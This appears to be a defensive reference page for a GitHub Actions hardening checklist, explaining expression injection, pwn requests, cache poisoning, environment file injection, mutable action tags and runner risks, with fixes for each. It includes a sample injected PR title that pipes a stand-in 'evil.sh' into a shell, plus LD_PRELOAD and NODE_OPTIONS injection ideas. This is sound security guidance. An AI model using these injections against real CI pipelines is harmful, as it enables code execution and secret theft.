# GitHub Actions attacks

The attack behind each item in the hardening checklist. Read this to explain a finding or to judge a case the checklist does not cover.

## Expression injection

The runner substitutes `${{ }}` into the script text before the shell starts. A PR titled `a"; curl evil.sh | sh; echo "` turns `run: echo "${{ github.event.pull_request.title }}"` into three commands. `actions/github-script` has the same flaw with JavaScript: `script: console.log("${{ github.event.issue.title }}")` runs whatever the title closes the string with.

Tainted contexts include `github.event.{issue,pull_request,comment,review,discussion}.*` (titles, bodies, labels), `github.head_ref`, `github.event.head_commit.*`, `github.event.commits.*`, `github.event.workflow_run.head_branch`, and `inputs.*` on workflows others can dispatch. A step output derived from any of these is tainted too.

The fix is `env:`. The runner places the value in the process environment, and `"$VAR"` reads it as one string that the shell never parses as code.

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## Pwn requests

`pull_request_target` and `workflow_run` run with the base repo's secrets and a token that can write. Checking out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`) and then running anything from it (`bun install` lifecycle scripts, a build, tests, a linter config that loads plugins) hands those privileges to the PR author.

`pull_request` from a fork gets no secrets and a read-only token. That is the safe place for fork code. When a privileged follow-up is needed, use the two-workflow pattern in [TEMPLATES.md](TEMPLATES.md).

## Artifact and cache poisoning

The artifact a `workflow_run` job downloads was written by fork code. If it lands in the workspace and the job then runs `./scripts/report.sh` or `bun run`, the artifact can supply that file. Download artifacts to `${{ runner.temp }}`, parse them as data, and validate every field before use.

Caches cross trust levels in one direction: a cache saved on the default branch is restorable by every PR. A privileged run on the base branch that executes tainted code can save a poisoned cache that later release builds restore. zizmor's `cache-poisoning` audit flags release workflows that restore caches. Release and publish jobs should build without restoring caches.

## Environment file injection

`$GITHUB_ENV` and `$GITHUB_PATH` change every later step in the job. A tainted write such as `echo "NAME=$TITLE" >> "$GITHUB_ENV"` lets the attacker add a line like `LD_PRELOAD=...` or `NODE_OPTIONS=--require=...` and gain code execution in the next step. Keep tainted values out of these files entirely.

`$GITHUB_OUTPUT` with a heredoc has a smaller version of the same problem. With a fixed delimiter like `EOF`, a value containing a line `EOF` ends early, and the lines after it become new outputs. Generate the delimiter at runtime with `openssl rand -hex 16`.

## Mutable refs and impostor commits

Tags and branches move. When a maintainer account is compromised, the attacker re-points `v4` at malicious code, and every workflow using `@v4` runs it on its next trigger. This happened to `tj-actions/changed-files` in March 2025 (CVE-2025-30066): the retagged action printed CI secrets into the logs of the repos that ran it. A 40-character SHA cannot be re-pointed.

A SHA can still lie. GitHub serves commits from any fork of a repo through the parent's URL, so `actions/checkout@<sha>` resolves even when the SHA exists only in an attacker's fork. `pin-action.sh` resolves SHAs from the upstream repo's own tags, and `lint.sh --online` runs zizmor's `impostor-commit` audit on SHAs already present.

## Persisted checkout credentials

`actions/checkout` writes the job token into `.git/config` by default. Any later step that uploads the workspace as an artifact, bakes it into an image, or runs a tool that reads git config can leak it. The ArtiPACKED research found such leaks in public artifacts from major projects. `persist-credentials: false` keeps the token out of the workspace.

## Long-lived credentials

A cloud key stored in repository secrets is valid everywhere until someone rotates it, and every workflow that can read secrets can exfiltrate it. With OIDC, the job exchanges a short-lived signed token for cloud credentials. The cloud trust policy can bind those credentials to one repo, branch, or environment. Registry trusted publishing (npm, PyPI, crates.io) works the same way for package releases.

## Self-hosted runners

A non-ephemeral self-hosted runner keeps its disk, processes, and network access between jobs. On a public repo, any fork PR can run code on it, persist a backdoor, and reach internal networks and cloud metadata at `169.254.169.254`. Restrict self-hosted runners to private repos, use ephemeral runners (Actions Runner Controller recreates the pod per job), and limit egress.
